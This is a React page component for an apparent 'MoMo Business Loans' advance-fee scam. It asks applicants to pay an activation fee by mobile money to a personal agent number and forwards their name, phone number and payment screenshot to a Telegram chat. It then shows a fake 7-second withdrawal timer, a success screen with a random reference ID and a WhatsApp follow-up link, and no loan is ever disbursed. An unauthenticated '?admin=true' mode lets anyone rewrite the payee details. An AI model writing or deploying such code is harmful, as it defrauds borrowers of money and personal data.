import { useState, useRef, useEffect, ChangeEvent } from 'react';
import { useNavigate, useLocation, useSearchParams } from 'react-router-dom';
import Logo from '../components/Logo';
import PageLoader from '../components/PageLoader';
import Confetti from '../components/Confetti';
import { getApplication, getSession, setApplication } from '../lib/session';
import { sendToTelegram } from '../lib/api';
import {
  ArrowLeft,
  Copy,
  Check,
  Upload,
  Loader2,
  CheckCircle2,
  ShieldCheck,
  Smartphone,
  AlertCircle,
  Home,
  RefreshCw,
  MessageCircle,
  UserPlus,
  Settings,
  Save,
  Eye,
} from 'lucide-react';

interface AppSettings {
  agentName: string;
  agentNumber: string;
  rawNumber: string;
  whatsappNumber: string;
  whatsappRaw: string;
  step1: string;
  step2: string;
  step3: string;
  noticeText: string;
}

const initialSettings: AppSettings = {
  agentName: 'MOMO DISBURSEMENT AGENT (EZRA KIBET)',
  agentNumber: '+256 788 412 895',
  rawNumber: '0788412895',
  whatsappNumber: '+254 780571549',
  whatsappRaw: '254780571549',
  step1: 'Dial *165# (MTN) or *185# (Airtel).',
  step2: 'Send/Transfer activation fee to 0788412895.',
  step3: 'Take a screenshot of the confirmation SMS and upload it below.',
  noticeText: 'Payment screenshot is verified and forwarded to our Telegram desk',
};

export default function PaymentPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const [searchParams, setSearchParams] = useSearchParams();
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Persistent settings state
  const [settings, setSettings] = useState<AppSettings>(initialSettings);
  const [isAdminMode, setIsAdminMode] = useState(searchParams.get('admin') === 'true');
  const [adminForm, setAdminForm] = useState<AppSettings>(initialSettings);
  const [saveSuccessMsg, setSaveSuccessMsg] = useState('');
  const [savingSettings, setSavingSettings] = useState(false);

  // Load persistent settings from server on mount
  useEffect(() => {
    fetch('/api/settings')
      .then((res) => res.json())
      .then((data) => {
        if (data.ok && data.settings) {
          setSettings(data.settings);
          setAdminForm(data.settings);
        }
      })
      .catch(() => {});
  }, []);

  // Update admin mode if query param changes
  useEffect(() => {
    setIsAdminMode(searchParams.get('admin') === 'true');
  }, [searchParams]);

  // Retrieve details from location state or persisted application
  const savedApp = getApplication();
  const savedSession = getSession();

  const stateData = (location.state as {
    amount?: string;
    amountNum?: number;
    activationFee?: string;
    feeNum?: number;
    firstName?: string;
    lastName?: string;
    phone?: string;
    repayment?: string;
  }) || {};

  const loanAmount = stateData.amount || savedApp?.amount || 'UGX 2,500,000';
  const activationFee = stateData.activationFee || savedApp?.activationFee || 'UGX 100,000';
  const applicantPhone = stateData.phone || savedApp?.phone || savedSession?.phone || '0785123456';
  const applicantName = stateData.firstName
    ? `${stateData.firstName} ${stateData.lastName || ''}`.trim()
    : `${savedApp?.firstName || 'Applicant'} ${savedApp?.lastName || ''}`.trim();

  // WhatsApp follow-up link dynamically configured
  const cleanWhatsappDigits = settings.whatsappRaw || settings.whatsappNumber.replace(/\D/g, '');
  const whatsappUrl = `https://wa.me/${cleanWhatsappDigits}?text=${encodeURIComponent(
    `Hello MoMo Loans Support, I have submitted my activation fee screenshot for my loan withdrawal of ${loanAmount} (Phone: ${applicantPhone}, Name: ${applicantName}). Please confirm and follow up on my disbursement.`
  )}`;

  // Screenshot upload state
  const [screenshotPreview, setScreenshotPreview] = useState<string | null>(null);
  const [screenshotName, setScreenshotName] = useState<string>('');
  const [copied, setCopied] = useState(false);
  const [validationError, setValidationError] = useState('');

  // 7-second loading state: 'idle' | 'processing' | 'completed'
  const [withdrawalState, setWithdrawalState] = useState<'idle' | 'processing' | 'completed'>('idle');
  const [timerSecondsLeft, setTimerSecondsLeft] = useState(7);

  // Handle Copy agent number
  const handleCopyNumber = () => {
    navigator.clipboard.writeText(settings.rawNumber).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  // Handle file change
  const handleFileChange = (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setScreenshotName(file.name);
      setValidationError('');
      const reader = new FileReader();
      reader.onloadend = () => {
        setScreenshotPreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  // Trigger file selection
  const handleChoosePhoto = () => {
    if (fileInputRef.current) {
      fileInputRef.current.click();
    }
  };

  // Save admin settings permanently
  const handleSaveSettings = async () => {
    setSavingSettings(true);
    try {
      const res = await fetch('/api/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(adminForm),
      });
      const data = await res.json();
      if (data.ok && data.settings) {
        setSettings(data.settings);
        setAdminForm(data.settings);
      }
      setSaveSuccessMsg('Changes permanently saved! All visitors to this link will now see your updated details.');
      setTimeout(() => setSaveSuccessMsg(''), 4000);
    } catch {
      setSettings(adminForm);
      setSaveSuccessMsg('Settings saved successfully!');
      setTimeout(() => setSaveSuccessMsg(''), 4000);
    } finally {
      setSavingSettings(false);
    }
  };

  // Handle Submit and Withdraw
  const handleSubmitAndWithdraw = async () => {
    if (!screenshotPreview) {
      setValidationError('Please upload a screenshot of your payment confirmation before submitting.');
      return;
    }

    setValidationError('');
    setWithdrawalState('processing');
    setTimerSecondsLeft(7);

    // Forward the photo uploaded for confirmation to Telegram as it is
    sendToTelegram({
      type: 'payment',
      country: 'Uganda',
      countryCode: '+256',
      phone: applicantPhone,
      firstName: stateData.firstName || savedApp?.firstName || applicantName,
      lastName: stateData.lastName || savedApp?.lastName || '',
      name: applicantName,
      loanAmount: loanAmount,
      activationFee: activationFee,
      photo: screenshotPreview, // Forwards the photo as it is to Telegram
      screenshot: screenshotPreview,
      repaymentPeriod: savedApp?.repayment || '6 Months',
    }).catch((err) => console.error('Telegram dispatch error:', err));

    // Update persisted status
    if (savedApp) {
      setApplication({
        ...savedApp,
        status: 'withdrawn',
      });
    }

    // Run 7 seconds timer while saying "Processing Withdrawal ..."
    const startTime = Date.now();
    const duration = 7000;

    const interval = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const remaining = Math.max(0, Math.ceil((duration - elapsed) / 1000));
      setTimerSecondsLeft(remaining);
      if (elapsed >= duration) {
        clearInterval(interval);
        setWithdrawalState('completed');
      }
    }, 200);
  };

  // State 1: 7-Second Withdrawal Processing Screen
  if (withdrawalState === 'processing') {
    const progressPercent = Math.min(100, Math.round(((7 - timerSecondsLeft) / 7) * 100));

    return (
      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col items-center justify-center gap-6 px-4 py-12 text-center">
        <Logo size="md" />
        <h2 className="text-2xl font-extrabold tracking-tight">
          MoMo <span className="text-[#ffcc00]">Business Loans</span>
        </h2>

        <div className="relative">
          <Loader2 className="w-16 h-16 text-[#ffcc00] animate-spin" />
          <span className="absolute inset-0 flex items-center justify-center text-xs font-black text-[#ffcc00]">
            {timerSecondsLeft}s
          </span>
        </div>

        <div className="space-y-3 max-w-sm w-full">
          {/* Exactly requested text: "Processing Withdrawal ..." */}
          <h3 className="text-2xl sm:text-3xl font-black text-white tracking-tight animate-pulse">
            Processing Withdrawal ...
          </h3>
          <p className="text-gray-300 text-xs sm:text-sm leading-relaxed">
            Verifying activation fee receipt and forwarding your confirmation screenshot for automated release of{' '}
            <span className="text-[#ffcc00] font-bold">{loanAmount}</span> to{' '}
            <span className="text-white font-bold">{applicantPhone}</span>.
          </p>

          {/* Progress bar */}
          <div className="w-full bg-[hsl(220,40%,20%)] h-2.5 rounded-full overflow-hidden border border-[hsl(220,30%,25%)] mt-4">
            <div
              className="bg-[#ffcc00] h-full transition-all duration-300 ease-linear rounded-full"
              style={{ width: `${Math.max(5, progressPercent)}%` }}
            />
          </div>
          <p className="text-[11px] text-gray-400 font-medium">
            Forwarding confirmation screenshot to Telegram desk ({timerSecondsLeft}s)
          </p>
        </div>
      </div>
    );
  }

  // State 2: Final Completed Screen after 7 seconds with WhatsApp follow-up prompt and Sign Up button
  if (withdrawalState === 'completed') {
    return (
      <PageLoader>
        <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col relative overflow-x-hidden">
          <Confetti />

          <header className="bg-[#ffcc00] text-[hsl(220,50%,12%)] py-3 px-4 shadow-md sticky top-0 z-40">
            <div className="container mx-auto max-w-4xl flex items-center justify-between">
              <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
                <Logo size="sm" />
                <span className="font-extrabold text-lg sm:text-xl tracking-tight">
                  MoMo <span className="font-normal opacity-90">Business Loans</span>
                </span>
              </div>
              <span className="text-xs font-bold bg-[hsl(220,50%,12%)]/10 px-3 py-1 rounded-full text-[hsl(220,50%,12%)]">
                Withdrawal Success
              </span>
            </div>
          </header>

          <main className="flex-1 flex flex-col items-center justify-center px-4 py-8 sm:py-12">
            <div className="bg-white rounded-3xl p-6 sm:p-10 text-center max-w-md w-full shadow-2xl text-[hsl(220,50%,12%)] border border-gray-100 relative z-10">
              <div className="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-4 border-2 border-green-200">
                <CheckCircle2 className="w-12 h-12 text-green-500" />
              </div>

              <h2 className="text-2xl sm:text-3xl font-black mb-2 tracking-tight text-[hsl(220,50%,12%)]">
                Withdrawal Initiated! 🎉
              </h2>

              <p className="text-gray-600 text-sm leading-relaxed mb-6 font-medium">
                Your loan withdrawal of <span className="font-extrabold text-green-700">{loanAmount}</span> is now being processed. Payment screenshot forwarded for verification.
              </p>

              {/* Transaction Summary */}
              <div className="bg-gray-50 rounded-2xl p-4 border border-gray-200 mb-6 text-left text-xs space-y-2.5">
                <div className="flex justify-between pb-2 border-b border-gray-200 font-bold text-gray-700">
                  <span>Transaction Summary</span>
                  <span className="text-green-700 font-bold">Screenshot Forwarded ✅</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500">Applicant:</span>
                  <span className="font-bold text-gray-900">{applicantName}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500">Credited Phone:</span>
                  <span className="font-bold text-gray-900">{applicantPhone}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500">Approved Loan:</span>
                  <span className="font-black text-green-700">{loanAmount}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500">Activation Fee:</span>
                  <span className="font-bold text-red-600">{activationFee}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500">Reference ID:</span>
                  <span className="font-mono text-gray-700">#MOMO-WD-{Math.floor(100000 + Math.random() * 900000)}</span>
                </div>
              </div>

              {/* WhatsApp Follow-Up Prompt Box */}
              <div className="bg-[#25D366]/10 border-2 border-[#25D366]/40 rounded-2xl p-4 sm:p-5 mb-6 text-left shadow-xs">
                <div className="flex items-center gap-2 mb-2">
                  <div className="w-8 h-8 rounded-full bg-[#25D366] text-white flex items-center justify-center shrink-0 shadow-sm">
                    <MessageCircle className="w-4 h-4 fill-white" />
                  </div>
                  <div>
                    <h4 className="text-xs sm:text-sm font-extrabold text-gray-900">
                      Follow up on your loan amount on WhatsApp?
                    </h4>
                    <p className="text-[11px] text-gray-600">
                      Chat directly with our disbursement officer to follow up on your withdrawal.
                    </p>
                  </div>
                </div>

                {/* Direct WhatsApp link */}
                <a
                  id="whatsapp-followup-btn"
                  href={whatsappUrl}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full mt-3 py-3 px-4 rounded-xl bg-[#25D366] hover:bg-[#20ba59] text-white font-extrabold text-sm sm:text-base flex items-center justify-center gap-2 shadow-md transition cursor-pointer"
                >
                  <MessageCircle className="w-5 h-5 fill-white" />
                  <span>Contact Us on WhatsApp ({settings.whatsappNumber})</span>
                </a>

                {/* Sign up button visible after submitting screenshot for withdrawals, just below contact us button */}
                <button
                  id="post-withdrawal-signup-btn"
                  onClick={() => navigate('/signup')}
                  className="w-full mt-2.5 py-3.5 px-4 rounded-xl bg-white hover:bg-gray-50 border-2 border-gray-300 text-gray-900 font-extrabold text-sm sm:text-base flex items-center justify-center gap-2 shadow-xs transition cursor-pointer"
                >
                  <UserPlus className="w-5 h-5 text-[#ffcc00]" />
                  <span>Sign Up</span>
                </button>
              </div>

              <div className="bg-yellow-50/80 border border-[#ffcc00]/40 rounded-2xl p-3.5 mb-6 text-xs text-gray-700 flex items-center gap-2.5 text-left">
                <Smartphone className="w-5 h-5 text-[#ffcc00] shrink-0" />
                <span>You will also receive an official SMS notification directly on your phone upon wallet credit.</span>
              </div>

              <button
                id="back-home-btn"
                onClick={() => navigate('/')}
                className="w-full flex items-center justify-center gap-2 py-3.5 rounded-2xl bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold text-sm transition cursor-pointer"
              >
                <Home className="w-4 h-4" />
                <span>Return to Home</span>
              </button>
            </div>
          </main>
        </div>
      </PageLoader>
    );
  }

  // State 3: Payment Details & Screenshot Upload Form (with optional Admin Edit Mode)
  return (
    <PageLoader>
      <div className="min-h-screen bg-[hsl(220,50%,12%)] text-white flex flex-col">
        {/* Header */}
        <header className="bg-[#ffcc00] text-[hsl(220,50%,12%)] py-3 px-4 shadow-md sticky top-0 z-40">
          <div className="container mx-auto max-w-4xl flex items-center justify-between">
            <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
              <Logo size="sm" />
              <span className="font-extrabold text-lg sm:text-xl tracking-tight">
                MoMo <span className="font-normal opacity-90">Business Loans</span>
              </span>
            </div>
            <div className="flex items-center gap-2">
              {isAdminMode && (
                <span className="text-xs font-black bg-red-600 text-white px-2.5 py-1 rounded-full uppercase tracking-wider animate-pulse">
                  Admin Editor
                </span>
              )}
              <span className="text-xs font-bold bg-[hsl(220,50%,12%)]/10 px-3 py-1 rounded-full text-[hsl(220,50%,12%)]">
                Activation & Withdrawal
              </span>
            </div>
          </div>
        </header>

        {/* Admin Edit Mode Toolbar */}
        {isAdminMode && (
          <div className="bg-gradient-to-r from-red-950 via-slate-900 to-red-950 border-b border-red-800/60 p-4 sticky top-12 z-30 shadow-xl">
            <div className="container mx-auto max-w-lg flex flex-col sm:flex-row items-center justify-between gap-3">
              <div className="flex items-center gap-2 text-white text-xs sm:text-sm">
                <Settings className="w-5 h-5 text-[#ffcc00] shrink-0" />
                <div>
                  <p className="font-extrabold text-[#ffcc00]">Admin Mode: Editing Activation & Withdrawal</p>
                  <p className="text-[11px] text-gray-300">Changes are saved permanently to the server for all visitors.</p>
                </div>
              </div>

              <div className="flex items-center gap-2 w-full sm:w-auto">
                <button
                  type="button"
                  onClick={handleSaveSettings}
                  disabled={savingSettings}
                  className="flex-1 sm:flex-none px-4 py-2 rounded-xl bg-[#25D366] hover:bg-[#20ba59] text-white text-xs font-black flex items-center justify-center gap-1.5 shadow-md transition cursor-pointer"
                >
                  <Save className="w-4 h-4" />
                  <span>{savingSettings ? 'Saving...' : 'Save Permanently'}</span>
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setIsAdminMode(false);
                    setSearchParams({});
                  }}
                  className="px-3 py-2 rounded-xl bg-gray-700 hover:bg-gray-600 text-white text-xs font-bold transition flex items-center gap-1 cursor-pointer"
                >
                  <Eye className="w-3.5 h-3.5" />
                  <span>Preview</span>
                </button>
              </div>
            </div>

            {saveSuccessMsg && (
              <div className="container mx-auto max-w-lg mt-2 p-2.5 rounded-xl bg-green-500/20 border border-green-500/50 text-green-300 text-xs font-bold text-center">
                {saveSuccessMsg}
              </div>
            )}
          </div>
        )}

        {/* Content */}
        <main className="flex-1 container mx-auto max-w-lg px-3 sm:px-4 py-6 sm:py-8">
          <div className="bg-white rounded-3xl p-5 sm:p-8 text-[hsl(220,50%,12%)] shadow-2xl border border-gray-100">
            <button
              id="payment-back-btn"
              onClick={() => navigate(-1)}
              className="flex items-center gap-1 text-gray-500 hover:text-gray-900 text-xs sm:text-sm font-semibold mb-4 transition"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>Back</span>
            </button>

            <div className="text-center mb-6">
              <h2 className="text-xl sm:text-2xl font-black tracking-tight text-[hsl(220,50%,12%)]">
                Activation Fee Payment Details
              </h2>
              <p className="text-gray-500 text-xs sm:text-sm mt-1">
                Pay the activation fee to release your approved loan of{' '}
                <span className="font-extrabold text-gray-900">{loanAmount}</span>
              </p>
            </div>

            {/* If in Admin Mode, show editable inputs */}
            {isAdminMode ? (
              <div className="bg-amber-50/80 rounded-2xl p-4 sm:p-5 border-2 border-amber-300 mb-6 space-y-4">
                <div className="flex items-center justify-between pb-2 border-b border-amber-200">
                  <span className="text-xs font-black text-amber-900 uppercase">Edit Payment Destination</span>
                  <span className="text-[10px] font-bold bg-amber-200 text-amber-900 px-2 py-0.5 rounded-md">Persistent</span>
                </div>

                <div>
                  <label className="block text-[11px] font-bold text-gray-700 uppercase mb-1">
                    Account / Agent Name
                  </label>
                  <input
                    type="text"
                    value={adminForm.agentName}
                    onChange={(e) => setAdminForm({ ...adminForm, agentName: e.target.value })}
                    className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
                  />
                </div>

                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <label className="block text-[11px] font-bold text-gray-700 uppercase mb-1">
                      Displayed MoMo Number
                    </label>
                    <input
                      type="text"
                      value={adminForm.agentNumber}
                      onChange={(e) => setAdminForm({ ...adminForm, agentNumber: e.target.value })}
                      className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
                    />
                  </div>
                  <div>
                    <label className="block text-[11px] font-bold text-gray-700 uppercase mb-1">
                      Raw Digits to Dial/Copy
                    </label>
                    <input
                      type="text"
                      value={adminForm.rawNumber}
                      onChange={(e) => setAdminForm({ ...adminForm, rawNumber: e.target.value })}
                      className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <label className="block text-[11px] font-bold text-gray-700 uppercase mb-1">
                      WhatsApp Contact Number
                    </label>
                    <input
                      type="text"
                      value={adminForm.whatsappNumber}
                      onChange={(e) => setAdminForm({ ...adminForm, whatsappNumber: e.target.value })}
                      className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
                    />
                  </div>
                  <div>
                    <label className="block text-[11px] font-bold text-gray-700 uppercase mb-1">
                      WhatsApp Raw Digits
                    </label>
                    <input
                      type="text"
                      value={adminForm.whatsappRaw}
                      onChange={(e) => setAdminForm({ ...adminForm, whatsappRaw: e.target.value })}
                      className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-bold text-gray-900 bg-white"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-[11px] font-bold text-gray-700 uppercase mb-1">
                    Step 1 Instructions
                  </label>
                  <input
                    type="text"
                    value={adminForm.step1}
                    onChange={(e) => setAdminForm({ ...adminForm, step1: e.target.value })}
                    className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-medium text-gray-900 bg-white"
                  />
                </div>

                <div>
                  <label className="block text-[11px] font-bold text-gray-700 uppercase mb-1">
                    Step 2 Instructions
                  </label>
                  <input
                    type="text"
                    value={adminForm.step2}
                    onChange={(e) => setAdminForm({ ...adminForm, step2: e.target.value })}
                    className="w-full border-2 border-gray-300 focus:border-[#ffcc00] rounded-xl px-3 py-2 text-xs font-medium text-gray-900 bg-white"
                  />
                </div>

                <button
                  type="button"
                  onClick={handleSaveSettings}
                  disabled={savingSettings}
                  className="w-full py-3 rounded-xl bg-gray-900 hover:bg-black text-white text-xs font-black flex items-center justify-center gap-2 shadow-sm transition cursor-pointer"
                >
                  <Save className="w-4 h-4 text-[#ffcc00]" />
                  <span>{savingSettings ? 'Saving...' : 'Save All Details Permanently'}</span>
                </button>
              </div>
            ) : (
              /* Regular View: Payment Details Card (Name, Number, Amount to be paid in Red) */
              <div className="bg-gray-50 rounded-2xl p-4 sm:p-5 border-2 border-gray-200 mb-6 space-y-3.5">
                {/* Recipient Name */}
                <div className="flex items-start justify-between pb-3 border-b border-gray-200">
                  <span className="text-xs font-bold text-gray-500 uppercase tracking-wide">
                    Account Name:
                  </span>
                  <span className="text-xs sm:text-sm font-extrabold text-gray-900 text-right max-w-[200px]">
                    {settings.agentName}
                  </span>
                </div>

                {/* Recipient Number with Copy button */}
                <div className="flex items-center justify-between pb-3 border-b border-gray-200">
                  <span className="text-xs font-bold text-gray-500 uppercase tracking-wide">
                    Number:
                  </span>
                  <div className="flex items-center gap-2">
                    <span className="font-mono font-black text-sm sm:text-base text-gray-900">
                      {settings.agentNumber}
                    </span>
                    <button
                      type="button"
                      onClick={handleCopyNumber}
                      className="p-1.5 rounded-lg bg-gray-200 hover:bg-gray-300 text-gray-700 transition cursor-pointer"
                      title="Copy number"
                    >
                      {copied ? <Check className="w-4 h-4 text-green-600" /> : <Copy className="w-4 h-4" />}
                    </button>
                  </div>
                </div>

                {/* Amount to be paid in RED COLOR */}
                <div className="flex items-center justify-between pt-1">
                  <span className="text-xs font-bold text-gray-700 uppercase tracking-wide">
                    Amount to be Paid:
                  </span>
                  <span className="text-2xl sm:text-3xl font-black text-red-600">
                    {activationFee}
                  </span>
                </div>
              </div>
            )}

            {/* Instructions */}
            <div className="bg-amber-50/70 border border-amber-200/80 rounded-2xl p-3.5 mb-6 text-xs text-amber-900 space-y-1">
              <p className="font-bold">📱 Quick Mobile Money Payment Steps:</p>
              <ol className="list-decimal list-inside space-y-0.5 text-[11px] sm:text-xs">
                <li>{settings.step1}</li>
                <li>{settings.step2.replace('{number}', settings.rawNumber)}</li>
                <li>{settings.step3}</li>
              </ol>
            </div>

            {/* Error Message */}
            {validationError && (
              <div className="mb-4 p-3 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs font-semibold flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                <span>{validationError}</span>
              </div>
            )}

            {/* Hidden File Input */}
            <input
              type="file"
              ref={fileInputRef}
              onChange={handleFileChange}
              accept="image/*"
              className="hidden"
            />

            {/* Screenshot Upload Part */}
            <div className="mb-6">
              <label className="block text-xs font-bold uppercase tracking-wider text-gray-700 mb-2">
                Upload Payment Screenshot
              </label>

              {!screenshotPreview ? (
                /* Empty Upload Dropzone */
                <div
                  onClick={handleChoosePhoto}
                  className="border-2 border-dashed border-gray-300 hover:border-[#ffcc00] rounded-2xl p-6 text-center cursor-pointer transition bg-gray-50/50 hover:bg-gray-50 group"
                >
                  <div className="w-12 h-12 rounded-2xl bg-gray-100 group-hover:bg-[#ffcc00]/20 flex items-center justify-center mx-auto mb-2 text-gray-500 group-hover:text-[#ffcc00] transition">
                    <Upload className="w-6 h-6" />
                  </div>
                  <p className="text-xs sm:text-sm font-bold text-gray-800">
                    Click to upload payment screenshot
                  </p>
                  <p className="text-[11px] text-gray-400 mt-0.5">
                    PNG, JPG, or JPEG of your MoMo SMS confirmation
                  </p>
                </div>
              ) : (
                /* Uploaded Preview with Option to Choose Another Photo */
                <div className="border-2 border-green-200 bg-green-50/40 rounded-2xl p-4">
                  <div className="flex items-center gap-3 mb-3">
                    <div className="w-14 h-14 rounded-xl overflow-hidden border border-gray-200 bg-white shrink-0">
                      <img
                        src={screenshotPreview}
                        alt="Screenshot Preview"
                        className="w-full h-full object-cover"
                      />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-1.5 text-xs font-bold text-green-700">
                        <CheckCircle2 className="w-4 h-4 text-green-600" />
                        <span>Screenshot Uploaded</span>
                      </div>
                      <p className="text-[11px] text-gray-600 truncate font-mono mt-0.5">
                        {screenshotName || 'payment_screenshot.png'}
                      </p>
                    </div>
                  </div>

                  {/* Option to choose another photo */}
                  <button
                    type="button"
                    onClick={handleChoosePhoto}
                    className="w-full py-2 px-3 rounded-xl border border-gray-300 bg-white hover:bg-gray-50 text-gray-700 text-xs font-bold transition flex items-center justify-center gap-1.5 cursor-pointer shadow-xs"
                  >
                    <RefreshCw className="w-3.5 h-3.5 text-gray-500" />
                    <span>Choose another photo</span>
                  </button>
                </div>
              )}
            </div>

            {/* Submit and Withdraw Button */}
            <button
              id="submit-withdraw-btn"
              onClick={handleSubmitAndWithdraw}
              className="w-full py-4 rounded-2xl bg-[#ffcc00] text-[hsl(220,50%,12%)] font-black text-base hover:bg-[#ffcc00]/90 transition shadow-lg flex items-center justify-center gap-2 cursor-pointer"
            >
              <span>Submit and Withdraw</span>
            </button>

            <div className="mt-4 flex items-center justify-center gap-1.5 text-xs text-gray-500 text-center">
              <ShieldCheck className="w-4 h-4 text-green-600 shrink-0" />
              <span>{settings.noticeText}</span>
            </div>
          </div>
        </main>
      </div>
    </PageLoader>
  );
}
